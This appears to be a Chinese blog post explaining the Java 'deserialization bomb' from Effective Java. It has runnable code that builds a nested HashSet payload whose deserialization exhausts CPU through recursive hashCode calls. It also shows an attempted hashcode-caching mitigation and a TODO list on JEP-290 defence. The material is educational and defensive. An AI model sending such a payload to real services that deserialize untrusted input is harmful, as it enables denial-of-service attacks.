# 反序列化炸弹

一个出自《Effective Java》的例子：

```
https://github.com/jbloch/effective-java-3e-source-code/blob/bdc828a7af2bdfac28e3c38bd7d1a2ae05736ccc/src/effectivejava/chapter12/item85/DeserializationBomb.java
```

原文实例是散落在两个文件中的，将其整理到一个文件中：

```java
package com.cc11001100;

import java.io.*;
import java.util.HashSet;
import java.util.Set;

public class Main {

    /**
     * 把对象序列华为字节数组
     *
     * @param o
     * @return
     */
    public static byte[] serialize(Object o) {
        ByteArrayOutputStream ba = new ByteArrayOutputStream();
        try {
            new ObjectOutputStream(ba).writeObject(o);
        } catch (IOException e) {
            throw new IllegalArgumentException(e);
        }
        return ba.toByteArray();
    }

    /**
     * 从字节数组反序列化出来对象
     *
     * @param bytes
     * @return
     */
    public static Object deserialize(byte[] bytes) {
        try {
            return new ObjectInputStream(
                    new ByteArrayInputStream(bytes)).readObject();
        } catch (IOException | ClassNotFoundException e) {
            throw new IllegalArgumentException(e);
        }
    }

    /**
     * 构造会造成拒绝服务的序列化数组
     *
     * @return
     */
    static byte[] bomb() {
        Set<Object> root = new HashSet<>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<>();
        for (int i = 0; i < 100; i++) {
            Set<Object> t1 = new HashSet<>();
            Set<Object> t2 = new HashSet<>();
            t1.add("foo"); // make it not equal to t2
            s1.add(t1);
            s1.add(t2);
            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return serialize(root);
    }

    public static void main(String[] args) throws Exception {
        System.out.println(bomb().length);
        deserialize(bomb());
    }

}
```

原理是HashSet是基于HashMap实现的，而HashMap在反序列化的时候需要计算其hashcode，而它的hashcode方法的实现是计算其中每个元素的hashcode，而它里面的元素又都是HashMap，所以就递归计算，于是就类似于斐波那契树似的展开为一张非常庞大但是又有非常多重复计算的树：

```java
    /**
 * Returns the hash code value for this map.  The hash code of a map is
 * defined to be the sum of the hash codes of each entry in the map's
 * <tt>entrySet()</tt> view.  This ensures that <tt>m1.equals(m2)</tt>
 * implies that <tt>m1.hashCode()==m2.hashCode()</tt> for any two maps
 * <tt>m1</tt> and <tt>m2</tt>, as required by the general contract of
 * {@link Object#hashCode}.
 *
 * @implSpec
 * This implementation iterates over <tt>entrySet()</tt>, calling
 * {@link Map.Entry#hashCode hashCode()} on each element (entry) in the
 * set, and adding up the results.
 *
 * @return the hash code value for this map
 * @see Map.Entry#hashCode()
 * @see Object#equals(Object)
 * @see Set#equals(Object)
 */
public int hashCode(){
        int h=0;
        Iterator<Entry<K, V>>i=entrySet().iterator();
        while(i.hasNext())
        h+=i.next().hashCode();
        return h;
        }
```

我们可以尝试来破解一下这种庞大的计算，在动态规划中常用缓存来月约掉大量重复的计算，我们自定义一个Set，这个Set会缓存hashcode的计算结果：

```java
package com.cc11001100.bomb.cache;

import java.util.HashSet;

/**
 * 会缓存hashcode的Set
 *
 * @author CC11001100
 */
public class CacheHashcodeSet<E> extends HashSet<E> {

    private Integer hashcodeCache;

    @Override
    public int hashCode() {
        // 有缓存则使用缓存
        if (hashcodeCache != null) {
            return hashcodeCache;
        }
        // 无缓存时才会真正的计算
        return hashcodeCache = super.hashCode();
    }

}
```

然后将反序列化炸弹代码里的Set替换为带缓存的Set再运行一下就能很快完成反序列化：

```java
package com.cc11001100.bomb.cache;

import java.io.*;
import java.util.Set;

public class CrackBombMain {

    /**
     * 把对象序列华为字节数组
     *
     * @param o
     * @return
     */
    public static byte[] serialize(Object o) {
        ByteArrayOutputStream ba = new ByteArrayOutputStream();
        try {
            new ObjectOutputStream(ba).writeObject(o);
        } catch (IOException e) {
            throw new IllegalArgumentException(e);
        }
        return ba.toByteArray();
    }

    /**
     * 从字节数组反序列化出来对象
     *
     * @param bytes
     * @return
     */
    public static Object deserialize(byte[] bytes) {
        try {
            return new ObjectInputStream(
                    new ByteArrayInputStream(bytes)).readObject();
        } catch (IOException | ClassNotFoundException e) {
            throw new IllegalArgumentException(e);
        }
    }

    /**
     * 构造会造成拒绝服务的序列化数组
     *
     * @return
     */
    static byte[] bomb() {
        Set<Object> root = new CacheHashcodeSet<>();
        Set<Object> s1 = root;
        Set<Object> s2 = new CacheHashcodeSet<>();
        for (int i = 0; i < 100; i++) {

            Set<Object> t1 = new CacheHashcodeSet<>();
            t1.add("foo"); // make it not equal to t2
            s1.add(t1);
            s2.add(t1);

            Set<Object> t2 = new CacheHashcodeSet<>();
            s1.add(t2);
            s2.add(t2);

            s1 = t1;
            s2 = t2;
        }
        return serialize(root);
    }

    public static void main(String[] args) throws Exception {
        System.out.println(bomb().length); // Output: 7412
        deserialize(bomb());
    }

}
```

但是实际情况中基本没有实用性，一个是Set中的元素可能会是一直在变的，另一个是我们不太可能把所有的Map使用都写一个安全的实现并强制开发使用我们自己的实现，这几乎没法推广开来。



TODO
- 基于JEP-290防御 
- 反序列化炸弹配合消耗内存
- 反序列化炸弹配合消耗CPU
- 

















